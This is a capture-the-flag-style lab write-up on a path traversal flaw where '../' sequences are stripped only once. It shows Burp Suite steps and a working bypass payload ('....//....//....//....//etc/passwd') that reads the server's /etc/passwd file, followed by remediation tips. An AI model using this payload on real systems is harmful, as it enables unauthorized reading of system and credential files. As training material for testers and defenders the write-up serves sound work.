## 🧪 Lab: File Path Traversal - Traversal Sequences Stripped Non-Recursively  
**Level**: Practitioner  
**Date**: June 13, 2025  
**Goal**: Read `/etc/passwd` despite sanitization removing path traversal sequences.

---

### 🧰 Tools
- Burp Suite (Repeater / Interceptor)

---

### 🧭 Steps

1. **Intercept product image URL**  
   - Navigate to the product page and intercept the image request:
     ```
     GET /image?filename=218.png
     ```

2. **Send to Repeater**

3. **Try standard absolute path payload**  
   - Test with:
     ```
     filename=/etc/passwd
     ```

4. **Try basic traversal sequence**  
   - Use:
     ```
     filename=../../../etc/passwd
     ```
   - Fails due to sanitization that removes `../` sequences.

5. **Bypass using recursive traversal payload**  
   - Inject the following:
     ```
     filename=....//....//....//....//etc/passwd
     ```
   - The application strips one `./` from each segment (`../`), resulting in:
     ```
     ../../../../etc/passwd
     ```
   - Successfully retrieves the contents of `/etc/passwd`.

---

### 💣 Payload
```
....//....//....//....//etc/passwd
```

---

### 🔒 Remediation
- Sanitize and validate all user-supplied file paths.
- Normalize paths before processing to collapse sequences.
- Implement allow-lists for filenames.
- Restrict file access to secure directories only.
